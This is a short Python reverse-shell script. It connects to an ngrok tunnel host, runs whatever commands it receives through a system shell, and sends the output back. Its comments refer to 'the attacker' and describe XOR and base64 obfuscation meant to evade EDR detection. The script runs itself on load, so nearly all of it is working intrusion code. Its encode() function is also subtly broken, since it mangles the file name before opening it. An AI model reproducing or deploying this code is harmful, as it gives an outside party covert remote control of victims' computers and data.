import os
import base64
import subprocess
import socket

def prompt():
    _0x2dc = os.getcwd()
    _0x2db = socket.gethostname()
    _0x2da = os.getlogin()
    return f"\n{_0x2da}@{_0x2db}:{_0x2dc}$ "

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('0.tcp.eu.ngrok.io', 17117))
    while True:
        try:
            s.send(prompt().encode())
            cmd = s.recv(1024).decode().rstrip()
            if not cmd:
                continue
            CMD = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = CMD.communicate()
            # Send the output to the attacker in clear text
            s.send(stdout)
            s.send(stderr)
        except Exception as e:
            # Send the error message to the attacker in clear text
            s.send(str(e).encode())

def encode():
    # Use an obfuscated file name to evade EDR detection
    filename = ''.join([chr(ord(c) + 3) for c in 'RevShell.py'])
    with open(filename, 'r') as f:
        _0x2d3 = f.readlines()
    encoded_lines = []
    for _0x2d2 in _0x2d3:
        # Obfuscate the code of the file by XORing it with a key
        xor_key = 10
        encoded_line = ''.join([chr(ord(c) ^ xor_key) for c in _0x2d2])
        encoded_lines.append(encoded_line)
    encoded_file = ''.join(encoded_lines)
    # Encode the obfuscated file with base64 and return the result
    encoded_result = base64.b64encode(encoded_file.encode('utf-8')).decode('utf-8')
    return encoded_result

connect()
